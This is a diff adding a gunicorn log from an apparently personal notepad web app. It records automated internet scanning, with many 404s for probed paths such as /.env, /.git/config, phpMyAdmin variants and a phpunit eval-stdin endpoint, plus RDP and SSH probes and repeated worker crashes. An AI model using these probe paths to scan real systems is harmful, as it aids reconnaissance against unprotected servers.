@@ -1,0 +1,3186 @@
+nohup: ignoring input
+[2025-05-22 11:29:59 +0800] [3846911] [INFO] Starting gunicorn 22.0.0
+[2025-05-22 11:29:59 +0800] [3846911] [INFO] Listening at: http://0.0.0.0:8000 (3846911)
+[2025-05-22 11:29:59 +0800] [3846911] [INFO] Using worker: sync
+[2025-05-22 11:29:59 +0800] [3846912] [INFO] Booting worker with pid: 3846912
+[2025-05-22 11:30:10 +0800] [3846911] [INFO] Handling signal: hup
+[2025-05-22 11:30:10 +0800] [3846911] [INFO] Hang up: Master
+[2025-05-22 11:30:10 +0800] [3846984] [INFO] Booting worker with pid: 3846984
+[2025-05-22 11:30:10 +0800] [3846911] [ERROR] Worker (pid:3846912) was sent SIGHUP!
+Building prefix dict from the default dictionary ...
+Loading model from cache /tmp/jieba.cache
+Loading model cost 0.465 seconds.
+Prefix dict has been built successfully.
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /t4
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /boaform/admin/formLogin
+[2025-05-22 16:24:37 +0800] [3846984] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-22 16:28:11 +0800] [3846984] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-22 16:30:37 +0800] [3846984] [WARNING] Invalid request from ip=45.142.193.60: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.env
+Not Found: /ping.js
+Not Found: /version
+Not Found: /v1
+Not Found: /hudson
+Not Found: /v1
+Not Found: /version
+[2025-05-22 19:34:09 +0800] [3846984] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /cgi-bin/authLogin.cgi
+Not Found: /start/index.html
+Not Found: /pscc/
+Not Found: /pscc/
+Not Found: /start/index.html
+Not Found: /favicon.ico
+[2025-05-22 22:00:27 +0800] [3846984] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-22 22:00:27 +0800] [3846984] [INFO] Worker exiting (pid: 3846984)
+[2025-05-22 22:00:27 +0800] [3846911] [ERROR] Worker (pid:3846984) exited with code 255
+[2025-05-22 22:00:27 +0800] [3846911] [ERROR] Worker (pid:3846984) exited with code 255.
+[2025-05-22 22:00:27 +0800] [4041329] [INFO] Booting worker with pid: 4041329
+Not Found: /favicon.ico
+[2025-05-22 23:18:09 +0800] [4041329] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-22 23:43:17 +0800] [4041329] [WARNING] Invalid request from ip=92.63.197.46: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-22 23:44:21 +0800] [4041329] [WARNING] Invalid request from ip=3.137.73.221: Invalid HTTP request line: 'SSH-2.0-Go'
+Not Found: /.env
+[2025-05-23 01:26:59 +0800] [4041329] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-23 02:00:06 +0800] [4041329] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ping.js
+Not Found: /_profiler/phpinfo
+Not Found: /manager/html
+[2025-05-23 04:29:58 +0800] [4041329] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /manager/html
+Not Found: /cgi-bin/luci/api/auth
+Not Found: /cgi-bin/luci/api/auth
+Not Found: /.git/config
+[2025-05-23 09:12:59 +0800] [4041329] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-23 09:27:45 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:4041329)
+[2025-05-23 09:27:45 +0800] [4041329] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-23 09:27:45 +0800] [4041329] [INFO] Worker exiting (pid: 4041329)
+[2025-05-23 09:27:46 +0800] [59346] [INFO] Booting worker with pid: 59346
+[2025-05-23 10:04:28 +0800] [59346] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /portal/redlion
+Not Found: /RapAgent.xgi
+Not Found: /v1/models
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[2025-05-23 12:55:24 +0800] [59346] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-23 13:02:03 +0800] [59346] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /443
+[2025-05-23 15:12:10 +0800] [59346] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /auth.html
+Not Found: /auth1.html
+Not Found: /wsman
+Not Found: /sslvpnLogin.html
+Not Found: /api/sonicos/auth
+Not Found: /api/sonicos/tfa
+[2025-05-23 16:29:49 +0800] [59346] [WARNING] Invalid request from ip=116.10.202.60: Invalid HTTP request line: ''
+Not Found: /boaform/admin/formLogin
+[2025-05-23 17:53:10 +0800] [59346] [WARNING] Invalid request from ip=45.142.193.72: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-23 18:16:07 +0800] [59346] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-23 19:19:52 +0800] [59346] [WARNING] Invalid request from ip=8.219.147.127: Invalid HTTP request line: ''
+Not Found: /favicon.ico
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /ping.js
+Not Found: /boaform/admin/formLogin
+[2025-05-24 00:07:11 +0800] [59346] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-24 00:53:56 +0800] [59346] [WARNING] Invalid request from ip=3.137.73.221: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-05-24 01:35:39 +0800] [59346] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-24 01:45:02 +0800] [59346] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /druid/index.html
+[2025-05-24 04:42:20 +0800] [59346] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /boaform/admin/formLogin
+Not Found: /favicon.ico
+[2025-05-24 08:18:10 +0800] [59346] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-24 08:18:10 +0800] [59346] [INFO] Worker exiting (pid: 59346)
+[2025-05-24 08:18:10 +0800] [3846911] [ERROR] Worker (pid:59346) exited with code 255
+[2025-05-24 08:18:10 +0800] [3846911] [ERROR] Worker (pid:59346) exited with code 255.
+[2025-05-24 08:18:10 +0800] [481450] [INFO] Booting worker with pid: 481450
+Not Found: /favicon.ico
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /device.rsp
+Not Found: /sql/webadmin/index.php
+Not Found: /administrator/admin/index.php
+Not Found: /db/webadmin/index.php
+Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
+Not Found: /db/dbweb/index.php
+Not Found: /mysql/admin/index.php
+Not Found: /db/db-admin/index.php
+Not Found: /phppma/index.php
+Not Found: /phpmyadmin2/index.php
+Not Found: /phpmyadmin_/index.php
+Not Found: /phpmyadmin2021/index.php
+Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
+Not Found: /mysqladmin/index.php
+Not Found: /db/phpMyAdmin-5/index.php
+Not Found: /phpMyAdmin6/index.php
+Not Found: /mysql/pMA/index.php
+Not Found: /sql/phpmanager/index.php
+Not Found: /db/phpMyAdmin3/index.php
+Not Found: /phpmy-admin/index.php
+Not Found: /db/phpMyAdmin-3/index.php
+Not Found: /db/websql/index.php
+Not Found: /__phpmyadmin/index.php
+Not Found: /dbadmin/index.php
+Not Found: /db/webdb/index.php
+Not Found: /phpMyadmin/index.php
+Not Found: /myadmin/index.php
+Not Found: /administrator/pma/index.php
+Not Found: /shopdb/index.php
+Not Found: /phpmyadmin1/index.php
+Not Found: /phpMyAdmin/index.php
+Not Found: /sql/webdb/index.php
+Not Found: /php-my-admin/index.php
+Not Found: /phpMyAdmin5/index.php
+Not Found: /_phpMyAdmin/index.php
+Not Found: /phpMyAdmin-latest-all-languages/index.php
+Not Found: /phpMyAdmin4/index.php
+Not Found: /sql/phpMyAdmin/index.php
+Not Found: /phpmyadmin2020/index.php
+Not Found: /administrator/PMA/index.php
+Not Found: /phpMyAdmin3/index.php
+Not Found: /administrator/phpmyadmin/index.php
+Not Found: /administrator/phpMyAdmin/index.php
+Not Found: /mysql/sqlmanager/index.php
+Not Found: /phpMyAdmin2/index.php
+Not Found: /sql/websql/index.php
+Not Found: /program/index.php
+Not Found: /phpMyAdmin-5.1.2/index.php
+Not Found: /db/phpmyadmin/index.php
+Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
+Not Found: /sql/phpmy-admin/index.php
+Not Found: /phpMyAdmin-5.2.0/index.php
+Not Found: /sql/php-myadmin/index.php
+Not Found: /sql/phpmyadmin5/index.php
+Not Found: /2phpmyadmin/index.php
+Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
+Not Found: /_phpmyadmin_/index.php
+Not Found: /phpMyAdmin-4/index.php
+Not Found: /mysql/web/index.php
+Not Found: /mysql/dbadmin/index.php
+Not Found: /administrator/db/index.php
+Not Found: /phpmyadmin3/index.php
+Not Found: /sql/sql/index.php
+Not Found: /sql/sqladmin/index.php
+Not Found: /mysql/pma/index.php
+Not Found: /phpMyAdmin-5.1.0/index.php
+Not Found: /sql/sqlweb/index.php
+Not Found: /phpmyadmin2019/index.php
+Not Found: /phpmyadmin2022/index.php
+Not Found: /db/phpmyadmin5/index.php
+Not Found: /pma/index.php
+Not Found: /db/phpMyAdmin-4/index.php
+Not Found: /phpmyadmin6/index.php
+Not Found: /phpmyadmin2018/index.php
+Not Found: /sql/sql-admin/index.php
+Not Found: /database/index.php
+Not Found: /phpmyAdmin/index.php
+Not Found: /phpMyAdmin_/index.php
+Not Found: /mysql-admin/index.php
+Not Found: /sql/phpMyAdmin2/index.php
+Not Found: /phpmy/index.php
+Not Found: /db/phpmyadmin3/index.php
+Not Found: /phpMyAdmin-5.1.1/index.php
+Not Found: /phpMyAdmin-5.2.1-english/index.php
+Not Found: /_phpmyadmin/index.php
+Not Found: /phpMyAdmin5.1/index.php
+Not Found: /php-myadmin/index.php
+Not Found: /mysql/db/index.php
+Not Found: /index.php
+Not Found: /sql/phpmyadmin4/index.php
+Not Found: /db/dbadmin/index.php
+Not Found: /phpMyAdmin-5.2/index.php
+Not Found: /sqlmanager/index.php
+Not Found: /sql/myadmin/index.php
+Not Found: /phpMyAdmin-3/index.php
+Not Found: /phpMyAdmin-latest/index.php
+Not Found: /phpmyadmin/index.php
+Not Found: /phpMyAdmin-5.2.1/index.php
+Not Found: /administrator/web/index.php
+Not Found: /db/phpmyadmin4/index.php
+Not Found: /phpmyadmin4/index.php
+Not Found: /MyAdmin/index.php
+Not Found: /PMA/index.php
+Not Found: /mysql/index.php
+Not Found: /phpMyAdmin-5/index.php
+Not Found: /phpMyAdmin1/index.php
+Not Found: /db/myadmin/index.php
+Not Found: /1phpmyadmin/index.php
+Not Found: /sql/phpmyadmin3/index.php
+Not Found: /phpMyAdmin-4.9.7/index.php
+Not Found: /db/index.php
+Not Found: /phpMyAdmin5.2/index.php
+Not Found: /phpmyadmin2017/index.php
+Not Found: /phpMyAdmin-5.1.3/index.php
+Not Found: /mysqlmanager/index.php
+Not Found: /phpMyAdmin6.0/index.php
+Not Found: /phpmyadmin5/index.php
+Not Found: /db/phpMyAdmin/index.php
+Not Found: /phpMyAdmin-latest-english/index.php
+Not Found: /mysql/mysqlmanager/index.php
+Not Found: /Autodiscover/Autodiscover.xml
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025-05-24 12:00:42 +0800] [481450] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /boaform/admin/formLogin
+Not Found: /favicon.ico
+[2025-05-24 12:59:47 +0800] [481450] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-24 12:59:47 +0800] [481450] [INFO] Worker exiting (pid: 481450)
+[2025-05-24 12:59:47 +0800] [3846911] [ERROR] Worker (pid:481450) exited with code 255
+[2025-05-24 12:59:47 +0800] [3846911] [ERROR] Worker (pid:481450) exited with code 255.
+[2025-05-24 12:59:47 +0800] [568201] [INFO] Booting worker with pid: 568201
+Not Found: /favicon.ico
+Not Found: /solr/admin/info/system
+Not Found: /i
+Not Found: /s
+Not Found: /fssdcsrweqww.ini
+Not Found: /BoPai.xq
+Not Found: /9lqF
+Not Found: /login
+Not Found: /jquery/2.0.1/jquery.min.js
+Not Found: /Qi7wAH39
+Not Found: /kpi
+Not Found: /manjusaka/static/
+Not Found: /d.gif
+Not Found: /i.dat
+Not Found: /test6.jpg
+Not Found: /test7.jpg
+Not Found: /DBds
+Not Found: /aaa9
+Not Found: /aab8
+[2025-05-24 13:40:20 +0800] [568201] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /robots.txt
+Not Found: /php-cgi/php-cgi.exe
+[2025-05-24 18:48:03 +0800] [568201] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[2025-05-24 20:44:34 +0800] [568201] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /developmentserver/metadatauploader
+Not Found: /favicon.ico
+[2025-05-25 00:44:10 +0800] [568201] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-25 00:44:10 +0800] [568201] [INFO] Worker exiting (pid: 568201)
+[2025-05-25 00:44:10 +0800] [3846911] [ERROR] Worker (pid:568201) exited with code 255
+[2025-05-25 00:44:10 +0800] [3846911] [ERROR] Worker (pid:568201) exited with code 255.
+[2025-05-25 00:44:10 +0800] [784987] [INFO] Booting worker with pid: 784987
+Not Found: /favicon.ico
+[2025-05-25 00:54:05 +0800] [784987] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 01:17:28 +0800] [784987] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 01:47:45 +0800] [784987] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 02:04:21 +0800] [784987] [WARNING] Invalid request from ip=3.149.59.26: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-05-25 03:07:19 +0800] [784987] [WARNING] Invalid request from ip=37.60.241.154: Invalid HTTP request line: 'SSH-2.0-OpenSSH'
+Not Found: /favicon.ico
+Not Found: /i.php
+Not Found: /.env
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+[2025-05-25 08:01:25 +0800] [784987] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 08:06:19 +0800] [784987] [WARNING] Invalid request from ip=92.63.197.46: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+[2025-05-25 09:57:11 +0800] [784987] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 09:59:19 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:784987)
+[2025-05-25 09:59:19 +0800] [784987] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
